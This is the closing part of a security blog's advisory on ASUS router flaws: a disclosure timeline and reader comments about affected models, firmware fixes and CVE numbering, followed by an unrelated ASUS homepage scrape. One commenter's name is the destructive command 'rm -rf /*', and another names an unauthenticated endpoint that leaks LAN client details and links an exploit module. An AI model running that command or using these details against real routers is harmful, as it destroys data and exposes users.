2017-03-31: Fixed firmware released publicly by the vendor

2017-05-01: Draft advisory shared with the vendor and CERT/CC

2017-05-09: Public disclosure

### Share this:

* [Twitter](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?share=twitter "Click to share on Twitter")
* [Facebook](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?share=facebook "Click to share on Facebook")
Like Loading...

# Post navigation

[← Advisory: ChromeOS / ChromeBooks Persist Certain Network Settings in Guest Mode](https://wwws.nightwatchcybersecurity.com/2017/04/09/advisory-chromeos-chromebooks-persist-certain-network-settings-in-guest-mode/) [Advisory: Google I/O 2017 Android App Doesn’t Use SSL for Some Content [CVE-2017-9045] →](https://wwws.nightwatchcybersecurity.com/2017/05/17/advisory-google-io-2017-android-app/)

## 24 thoughts on “Multiple Vulnerabilities in ASUS Routers”

1. ![](https://0.gravatar.com/avatar/fd773bbe8b26f032726a92e4ce554233b12f160787b9b9ed836327d2c25bdfe3?s=60&d=identicon&r=G) **ng** says:
   [May 10, 2017 at 3:40 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-230)

   The Asus 4G-AC55U router is also affected by the issues listed in the article but it did not receive a firmware fix.

   The router is based on the same AsusWRT firmware as the RT series, just has a 4G LTE modem built in. The latest version 3.0.0.4.378.8150 was published a year ago on 2016-05-20 on the download page at <https://www.asus.com/Networking/4G-AC55U/HelpDesk_Download/>.

   I tested all the vulnerabilities listed above and can confirm they are present.

   Please update the article to warn the 4G-AC55U owners and pass this information to the vendor if possible.

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=230#respond)
   * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
     [May 10, 2017 at 9:03 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-234)

     We will take a look and update accordingly. Thank you for the information.

     [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=234#respond)
3. ![](https://0.gravatar.com/avatar/f054ce4e2e4fe8810322d414b88517af05a846599aab8372975eb0cfadd10c11?s=60&d=identicon&r=G) **asdf** says:
   [May 11, 2017 at 2:32 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-239)

   The JSONP Information Disclosure looks more like Cross-Site Script Inclusion (XSSI) as the URLs do not accept a user supplied callback parameter.

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=239#respond)
5. **[Advisory: CVE-2017-5891 and CVE-2017-5892 (Pending) | Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/2017/03/08/advisory-cve-2017-5891-and-cve-2017-5892-pending/)** says:
   [May 11, 2017 at 11:29 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-256)

   […] This has been published here. […]

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=256#respond)
7. ![](https://1.gravatar.com/avatar/df2173310eedabe90916687ac7d0e3891a25bd66247bdcb5b619c7583023276f?s=60&d=identicon&r=G) **Major** says:
   [May 12, 2017 at 7:10 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-260)

   RT-N56U last firmware update was 1/12/2017 as ver. 3.0.0.4.376.3754

   but im running ver. 3.0.0.4.378\_4850 (more current than official?)

   wondering if im hacked?

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=260#respond)
   * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
     [May 13, 2017 at 11:36 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-264)

     Not sure, sounds like it needs to be higher than v3.0.0.4.380.7378 and yours isn’t

     [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=264#respond)
9. ![](https://0.gravatar.com/avatar/3b712b9391d45badf98355fed652d8be8d0ef4c7c837d7a6f08a390f9fc8b04f?s=60&d=identicon&r=G) **PATRICK CHANG** says:
   [May 13, 2017 at 7:24 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-262)

   Can I assume the T-Mobile version of the RT-AC1900 is also affected – TM-AC1900? Its firmware remains at stuck at an earlier version.

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=262#respond)
   * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
     [May 13, 2017 at 11:35 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-263)

     We don’t know about the TM-AC19000

     [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=263#respond)
11. ![](https://i0.wp.com/pbs.twimg.com/profile_images/483749999277121536/ubnEd5-K_normal.jpeg?resize=60%2C60&ssl=1) **[John C Conkell (@juanzelli)](https://twitter.com/juanzelli)** says:
    [May 15, 2017 at 11:00 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-270)

    I’ve been using Merlin’s alternative firmware for over a year with zero issues… <https://asuswrt.lostrealm.ca>. He’s more interested in keeping things patched while only adding additional tweaks to the existing software. He doesn’t worry about trying to add new modules.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=270#respond)
13. ![](https://2.gravatar.com/avatar/b1a19d61e1850a59003179aff28f59e12b551f7e72a14a91c9ce7d41c99c82eb?s=60&d=identicon&r=G) **Johnny Sprocket** says:
    [May 17, 2017 at 12:51 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-276)

    I changed the SSL port on my RT-AC1900P to 8443. I tried to login using the standard HTTP:80 combo, and the router identifies itself as RT-N66U. The page shouldn’t resolve at all, but it seems the firmware has another flaw. Furthermore, the page will only render with Chrome on Windows 10 (1703). Firefox, IE, Edge show a connection error. A connection error is displayed via Chrome/Safari/Firefox from macOS as well. The ASUSRouter iOS app will no longer connect to the router, which could be a separate issue. Hopefully there is no vulnerabilities with this configuration. Can anyone confirm?

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=276#respond)
15. ![](https://2.gravatar.com/avatar/e5f890ce3c8fdafdf1d35983a38f5883fc7dcac9d7a44a383f0cfc34e7ca72c0?s=60&d=identicon&r=G) **[` rm -rf /\* `](https://itsecuritysolutions.org/)** says:
    [May 19, 2017 at 7:06 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-282)

    An authenticated session is not required to exploit the `/status.asp` XSSI information disclosure on Asus RT-N12E routers.

    The RT-N12E also exposes a `/get\_wan\_status.asp` file which discloses information such as the MAC addresses and IP addresses of client machines on the LAN.

    Here’s a BeEF module which exploits these issues:

    <https://github.com/beefproject/beef/tree/master/modules/exploits/router/asus_rt_n12e_get_info>

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=282#respond)
17. ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
    [May 28, 2017 at 7:47 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-291)

    Hey @nightwatchcyber

    Add this one to the list as well, RT-AC58U (or in the U.S. (and maybe other markets): RT-ACRH13).

    Verified manually with the CVE details and exploit code you have available, and the firmware version is also lower than the referenced 3.0.0.4.380\_6516, no newer one is available as of yet.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=291#respond)
    * ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
      [May 29, 2017 at 1:15 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-292)

      Update: I’ve contacted ASUS support via email, and they’ve informed me that there’s no ETA for the availability of a new firmware to fix this issues on this device (RT-AC58U/RT-ACRH13)

      [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=292#respond)
      + ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
        [June 15, 2017 at 5:47 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-336)

        Update: ASUS has released an update for the RT-AC58U. Should have the fixes implemented.

        ASUS RT-AC58U Firmware version 3.0.0.4.380.7485

        Add

        – Tx power adjust option

        – New Zealand ISP support

        – IPTV – HiNet MOD profile

        – Reboot Schedule support

        Optimization

        – Wireless 5GHz band performance

        – Wired performance in AP mode

        – Reduce system RAM usage

        – The max number of client connections

        Bug Fixes

        – Fixed system crash issue

        Please unzip the firmware file first then check the MD5 code.

        MD5: 71e06b665f988359a8b5f05c9bd00fbd
      + ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
        [June 15, 2017 at 8:23 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-337)

        Does this include the fixes for these issues?
      + ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
        [June 15, 2017 at 9:04 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-338)

        I believe it should, haven’t tested all yet. But the CVE-2017-5891 goes to the login page instead of logging in, so I’d say yes.
19. ![](https://0.gravatar.com/avatar/947b992398d28d05827ab93590e7af7859d46586ba81778faebcd7be94246afe?s=60&d=identicon&r=G) **Tim** says:
    [June 1, 2017 at 2:21 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-299)

    Updated my RT-N16 to firmware ver. 3.0.0.4.380\_7378 and can no longer get ports to negotiate a gigabit connection. ASUS support solution is to revert back. Heard of anyone else having this issue?

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=299#respond)
21. ![](https://0.gravatar.com/avatar/3a3b92c5d18557858f8c16b41c0fa402ddf6b9be892465114435025b740ff61f?s=60&d=identicon&r=G) **Tomi** says:
    [June 13, 2017 at 5:07 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-332)

    4G-AC55U has now new version of the firmware (3.0.0.4.380.7633). It should include fixes to the security problems.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=332#respond)
23. ![](https://0.gravatar.com/avatar/6fae4e7b4c6aa02516ce144c60490c93785c567e0fb2d2fc444446117791c03a?s=60&d=identicon&r=G) **Tomek** says:
    [June 15, 2017 at 3:18 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-335)

    RT-AC1200G+ is affected.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=335#respond)
    * ![](https://0.gravatar.com/avatar/053814a04062a142b0a5e555b82d3686fdc43086b1d1bd00f6f466f497cd6917?s=60&d=identicon&r=G) **nonqu** says:
      [June 16, 2017 at 8:16 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-339)

      Ane there is no firmware update

      [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=339#respond)
25. ![](https://0.gravatar.com/avatar/0cbe04901efd12c6c12daab7f0025aa542d9cf4cc851c0c2ca7cfc32bf4b8ac3?s=60&d=identicon&r=G) **Dennis** says:
    [July 20, 2017 at 2:17 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-397)

    ASUS RT-N66R Firmware version 3.0.0.4.380.7743 (July 17, 2017)

    Security fixed

    – Fixed CVE-2017-5892 (JSONP Information Disclosure)

    (among others)

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=397#respond)
27. **[Our Talk on ASUS Routers @BSidesDC | Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/2017/10/10/our-talk-on-asus-routers-bsidesdc/)** says:
    [October 10, 2017 at 10:35 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-747)

    […] weekend, we had a talk at BSides DC about hacking ASUS routers. The original blog post is here, slides for the talk can be found here, video can be found here (starting at the 3 hour […]

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=747#respond)
29. ![](https://0.gravatar.com/avatar/0985cfa6a4c670fd9cb3de24479c157c3eef2611859f0cc7f9e4b3397d0417f9?s=60&d=identicon&r=G) **tony** says:
    [January 29, 2018 at 11:03 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-937)

    Hi,

    Issue #3 – JSONP Information Disclosure Without Login (CVE-2017-5892)

    Issue #4 – JSONP Information Disclosure, Login Required (CVE-2017-8877)

    About above vulnerability, is there any typo about the CVE id?

    I have double check the pdf from below link:

    [Click to access bsides\_fall\_2017.pdf](https://wwwsnightwatchcybersecuritycom.files.wordpress.com/2017/10/bsides_fall_2017.pdf)

    Looks like,

    Issue #3 – JSONP Information Disclosure Without Login (CVE-2017-5892)

    – CVE should be CVE-2017-8877?

    Issue #4 – JSONP Information Disclosure, Login Required (CVE-2017-8877)

    – CVE should be CVE-2017-5892?

    Regards.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=937#respond)
    * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
      [January 30, 2018 at 9:59 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-938)

      We corrected that, thank you

      [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=938#respond)

### Leave a comment [Cancel reply](/2017/05/09/multiple-vulnerabilities-in-asus-routers/#respond)

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed.](https://akismet.com/privacy/)

# Search

Search for:

# Categories

* [Advisories](https://wwws.nightwatchcybersecurity.com/category/advisories/) (66)
* [Opinion](https://wwws.nightwatchcybersecurity.com/category/opinion/) (4)
* [Research](https://wwws.nightwatchcybersecurity.com/category/research/) (43)
* [Tools](https://wwws.nightwatchcybersecurity.com/category/tools/) (4)
* [Uncategorized](https://wwws.nightwatchcybersecurity.com/category/uncategorized/) (2)

# Recent Posts

* [Insecure Bootstrap Process in Google’s Cloud SQL Proxy](https://wwws.nightwatchcybersecurity.com/2023/03/19/insecure-bootstrap-process-in-googles-cloud-sql-proxy/)
* [RFC 9116 / “security.txt” Has Been Published](https://wwws.nightwatchcybersecurity.com/2022/04/27/rfc-9116-security-txt-has-been-published/)
* [GitBleed – Finding Secrets in Mirrored Git Repositories – CVE-2022-24975](https://wwws.nightwatchcybersecurity.com/2022/02/11/gitbleed/)
* [Insecure Bootstrap Process in Oracle Cloud CLI](https://wwws.nightwatchcybersecurity.com/2022/02/06/insecure-bootstrap-process-in-oracle-cloud-cli/)
* [Three Reasons Why Log4J Is So Bad: Ubiquity, Severity and Exploitability](https://wwws.nightwatchcybersecurity.com/2021/12/31/three-reasons-why-log4j-is-so-bad-ubiquity-severity-and-exploitability/)
# Tags

[adobe](https://wwws.nightwatchcybersecurity.com/tag/adobe/)
[airflow](https://wwws.nightwatchcybersecurity.com/tag/airflow/)
[amazon](https://wwws.nightwatchcybersecurity.com/tag/amazon/)
[Android](https://wwws.nightwatchcybersecurity.com/tag/android/)
[apache](https://wwws.nightwatchcybersecurity.com/tag/apache/)
[apple](https://wwws.nightwatchcybersecurity.com/tag/apple/)
[arro](https://wwws.nightwatchcybersecurity.com/tag/arro/)
[asus](https://wwws.nightwatchcybersecurity.com/tag/asus/)
[avg](https://wwws.nightwatchcybersecurity.com/tag/avg/)
[aws](https://wwws.nightwatchcybersecurity.com/tag/aws/)
[boozt](https://wwws.nightwatchcybersecurity.com/tag/boozt/)
[bounties](https://wwws.nightwatchcybersecurity.com/tag/bounties/)
[browsers](https://wwws.nightwatchcybersecurity.com/tag/browsers/)
[bsidesdc](https://wwws.nightwatchcybersecurity.com/tag/bsidesdc/)
[bsidesde](https://wwws.nightwatchcybersecurity.com/tag/bsidesde/)
[bugcrowd](https://wwws.nightwatchcybersecurity.com/tag/bugcrowd/)
[chrome](https://wwws.nightwatchcybersecurity.com/tag/chrome/)
[chromebook](https://wwws.nightwatchcybersecurity.com/tag/chromebook/)
[chromeos](https://wwws.nightwatchcybersecurity.com/tag/chromeos/)
[cisco](https://wwws.nightwatchcybersecurity.com/tag/cisco/)
[conferences](https://wwws.nightwatchcybersecurity.com/tag/conferences/)
[content-spoofing](https://wwws.nightwatchcybersecurity.com/tag/content-spoofing/)
[crosswalk](https://wwws.nightwatchcybersecurity.com/tag/crosswalk/)
[csrf](https://wwws.nightwatchcybersecurity.com/tag/csrf/)
[cve-2019-0221](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-0221/)
[cve-2019-0232](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-0232/)
[cve-2019-10320](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-10320/)
[duolingo](https://wwws.nightwatchcybersecurity.com/tag/duolingo/)
[eblaster](https://wwws.nightwatchcybersecurity.com/tag/eblaster/)
[eff](https://wwws.nightwatchcybersecurity.com/tag/eff/)
[facebook](https://wwws.nightwatchcybersecurity.com/tag/facebook/)
[firefox](https://wwws.nightwatchcybersecurity.com/tag/firefox/)
[fireos](https://wwws.nightwatchcybersecurity.com/tag/fireos/)
[github](https://wwws.nightwatchcybersecurity.com/tag/github/)
[gmail](https://wwws.nightwatchcybersecurity.com/tag/gmail/)
[google](https://wwws.nightwatchcybersecurity.com/tag/google/)
[gps](https://wwws.nightwatchcybersecurity.com/tag/gps/)
[hackerone](https://wwws.nightwatchcybersecurity.com/tag/hackerone/)
[intel](https://wwws.nightwatchcybersecurity.com/tag/intel/)
[io17](https://wwws.nightwatchcybersecurity.com/tag/io17/)
[java](https://wwws.nightwatchcybersecurity.com/tag/java/)
[jdk](https://wwws.nightwatchcybersecurity.com/tag/jdk/)
[jenkins](https://wwws.nightwatchcybersecurity.com/tag/jenkins/)
[jre](https://wwws.nightwatchcybersecurity.com/tag/jre/)
[jsonp](https://wwws.nightwatchcybersecurity.com/tag/jsonp/)
[kindle](https://wwws.nightwatchcybersecurity.com/tag/kindle/)
[macos](https://wwws.nightwatchcybersecurity.com/tag/macos/)
[messenger](https://wwws.nightwatchcybersecurity.com/tag/messenger/)
[microsoft](https://wwws.nightwatchcybersecurity.com/tag/microsoft/)
[mozilla](https://wwws.nightwatchcybersecurity.com/tag/mozilla/)
[no-ssl](https://wwws.nightwatchcybersecurity.com/tag/no-ssl/)
[office 365](https://wwws.nightwatchcybersecurity.com/tag/office-365/)
[open-redirect](https://wwws.nightwatchcybersecurity.com/tag/open-redirect/)
[oracle](https://wwws.nightwatchcybersecurity.com/tag/oracle/)
[paypal](https://wwws.nightwatchcybersecurity.com/tag/paypal/)
[pia](https://wwws.nightwatchcybersecurity.com/tag/pia/)
[pillpack](https://wwws.nightwatchcybersecurity.com/tag/pillpack/)
[privacy](https://wwws.nightwatchcybersecurity.com/tag/privacy/)
[qualcomm](https://wwws.nightwatchcybersecurity.com/tag/qualcomm/)
[routers](https://wwws.nightwatchcybersecurity.com/tag/routers/)
[s3](https://wwws.nightwatchcybersecurity.com/tag/s3/)
[samsung](https://wwws.nightwatchcybersecurity.com/tag/samsung/)
[spectorsoft](https://wwws.nightwatchcybersecurity.com/tag/spectorsoft/)
[ssl](https://wwws.nightwatchcybersecurity.com/tag/ssl/)
[supplychainattack](https://wwws.nightwatchcybersecurity.com/tag/supplychainattack/)
[synack](https://wwws.nightwatchcybersecurity.com/tag/synack/)
[tinycards](https://wwws.nightwatchcybersecurity.com/tag/tinycards/)
[tomcat](https://wwws.nightwatchcybersecurity.com/tag/tomcat/)
[united](https://wwws.nightwatchcybersecurity.com/tag/united/)
[vpn](https://wwws.nightwatchcybersecurity.com/tag/vpn/)
[whatsapp](https://wwws.nightwatchcybersecurity.com/tag/whatsapp/)
[wickr](https://wwws.nightwatchcybersecurity.com/tag/wickr/)
[windows](https://wwws.nightwatchcybersecurity.com/tag/windows/)
[yandex](https://wwws.nightwatchcybersecurity.com/tag/yandex/)
[zoho](https://wwws.nightwatchcybersecurity.com/tag/zoho/)
# Subscribe to Blog via Email

Enter your email address to subscribe to this blog and receive notifications of new posts by email.

Email Address:

Subscribe

Join 1,120 other subscribers

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Bugcrowd](https://bugcrowd.com/nightwatch-cybersecurity)
* [HackerOne](https://hackerone.com/nightwatch-cybersecurity)
* [Twitter](https://twitter.com/nightwatchcyber)

* [Comment](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comments)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s0.wp.com/i/logo/wpcom-gray-white.png) Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com)

  Join 115 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwwws.nightwatchcybersecurity.com%252F2017%252F05%252F09%252Fmultiple-vulnerabilities-in-asus-routers%252F)
* Privacy
* + [![](https://s0.wp.com/i/logo/wpcom-gray-white.png) Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwwws.nightwatchcybersecurity.com%252F2017%252F05%252F09%252Fmultiple-vulnerabilities-in-asus-routers%252F)
  + [Copy shortlink](https://wp.me/p7EvFy-nh)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/)
  + [View post in Reader](https://wordpress.com/read/blogs/113089212/posts/1443)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from www.asus.com_3f323a71_20250124_183134.html ===


Skip to content
 [Accessibility help](/content/Accessibility-Policy/) [![ROG](https://www.asus.com/media/Odin/images/header/ROG_normal.svg) ![ROG](https://www.asus.com/media/Odin/images/header/ROG_hover.svg)](https://rog.asus.com/)[![ProArt](https://www.asus.com/media/Odin/images/header/ProArt_normal.svg) ![ProArt](https://www.asus.com/media/Odin/images/header/ProArt_hover.svg)](https://www.asus.com/ProArt/)[![ASUS IoT](https://www.asus.com/media/Odin/images/header/IoT_normal.svg) ![ASUS IoT](https://www.asus.com/media/Odin/images/header/IoT_hover.svg)](https://iot.asus.com/)
Gaming
 [Business](https://www.asus.com/business/)[Environment](https://www.asus.com/content/sustainability-environment/)
Mobile / Handhelds

Laptops

Displays / Desktops

Motherboards / Components

Networking / IoT / Servers

Accessories

Support
  [Support](https://www.asus.com/support/)[ZenTalk](https://zentalk.asus.com/)[Drivers and manuals](https://www.asus.com/support/Download-Center/)[Check repair status](https://www.asus.com/support/rma-location)[MyASUS](https://www.asus.com/support/MyASUS-deeplink/)
My Account

Gaming
  [ROG - Republic of Gamers](https://rog.asus.com/)[TUF Gaming](https://www.asus.com/campaign/tuf-gaming/)[Business](https://www.asus.com/business/) [Environment](https://www.asus.com/content/sustainability-environment/)  [![ROG](https://www.asus.com/media/Odin/images/header/ROG_hover.svg)](https://rog.asus.com/)[![ProArt](https://www.asus.com/media/Odin/images/header/ProArt_hover.svg)](https://www.asus.com/ProArt/)[![ASUS IoT](https://www.asus.com/media/Odin/images/header/IoT_hover.svg)](https://iot.asus.com/)
Support

Create an ASUS account today to register your product for better support.
 [Learn more](https://account.asus.com/registerform.aspx)    [![ASUS ExpertBook B3(B3405)](/WebsitesBanner/global/banners/wy0rltl49er9ahjd/wy0rltl49er9ahjd-0_0_desktop_0_1X.webp)](https://www.asus.com/laptops/for-work/expertbook/asus-expertbook-b3-b3405/)  [ASUS ExpertBook B3](https://www.asus.com/laptops/for-work/expertbook/asus-expertbook-b3-b3405/)  [AI PC, configured for you](https://www.asus.com/laptops/for-work/expertbook/asus-expertbook-b3-b3405/)   [Learn more](https://www.asus.com/laptops/for-work/expertbook/asus-expertbook-b3-b3405/)   [![ASUS new X870/B850 Series](/WebsitesBanner/global/banners/tsckyfbuxslqzldc/tsckyfbuxslqzldc-0_0_desktop_0_1X.jpg)](https://www.asus.com/microsite/motherboard/amd-am5-ryzen-9000-x3d-x870e-x870-b850-b840/?utm_source=official-site&utm_medium=asus-b850-hero-banner)        [![ASUS Zenbook A14](/WebsitesBanner/global/banners/gie4wo5qffnq1upq/gie4wo5qffnq1upq-0_0_desktop_0_1X.webp)](https://www.asus.com/laptops/for-home/zenbook/asus-zenbook-a14-ux3407/)  [ASUS Zenbook A14](https://www.asus.com/laptops/for-home/zenbook/asus-zenbook-a14-ux3407/)  [Unload. Unplugged. Unlimited.](https://www.asus.com/laptops/for-home/zenbook/asus-zenbook-a14-ux3407/)   [Learn more](https://www.asus.com/laptops/for-home/zenbook/asus-zenbook-a14-ux3407/)   [![An ASUS NUC 14 Pro AI Mini PC with icons around it showcasing key features: Copilot+ PC, Wi-Fi 7, Voice Command, and Power Saving. Each icon highlights these unique product capabilities, creating a visually informative display of its strengths.](/WebsitesBanner/global/banners/cqcroi711cn5ols1/cqcroi711cn5ols1-0_0_desktop_0_1X.jpg)](https://www.asus.com/displays-desktops/nucs/nuc-mini-pcs/asus-nuc-14-pro-ai/)       [![Get to know Windows 11 Pro open in new window ](https://dlcdnimgs.asus.com/images/MDA2022/blue/en-us.jpg)](https://www.microsoft.com/windowsforbusiness) [![X1407QA](/WebsitesBanner/global/banners/zokztsnzrvfrcrgq/zokztsnzrvfrcrgq-0_0_desktop_0_1X.webp)](https://www.asus.com/laptops/for-home/vivobook/asus-vivobook-14-x1407q/)        [![The ROG Swift OLED PG27UCDM monitor displaying vibrant, colorful graphics with the ROG logo at its center. The background features abstract, colorful elements with a tagline "SEE AHEAD" across the screen. At the bottom, there are icons and text indicating features such as "ASUS OLED," "DP 2.1a UHBR20 with full 80Gbps," and "3 Year Warranty."](/WebsitesBanner/global/banners/n1msaxztcpwqascw/n1msaxztcpwqascw-0_0_desktop_0_1X.jpg)](https://rog.asus.com/monitors/27-to-31-5-inches/rog-swift-oled-pg27ucdm/)                             [![ROG Astral, TUF Gaming, Prime GeForce RTX 50 graphics card fly upward](/WebsitesBanner/global/banners/p5oieiwbjl30hu2n/p5oieiwbjl30hu2n-0_0_desktop_0_1X.jpg)](https://www.asus.com/microsite/Graphics-Cards/GeForce-RTX-50-Series/)              [![ASUS ExpertBook B3 (B3605)](/WebsitesBanner/global/banners/lavu05c6mipvdzsc/lavu05c6mipvdzsc-0_0_desktop_1_1X.webp)](https://www.asus.com/laptops/for-work/expertbook/asus-expertbook-b3-b3605/)
ASUS ExpertBook B3
 AI PC, configured for you   [Learn more](https://www.asus.com/laptops/for-work/expertbook/asus-expertbook-b3-b3605/) [![ASUS Expert P Series](/WebsitesBanner/global/banners/lavu05c6mipvdzsc/lavu05c6mipvdzsc-1_0_desktop_0_1X.webp)](https://www.asus.com/laptops/for-work/expertbook/expertbook-p5-p5405/)
ASUS Expert P Series
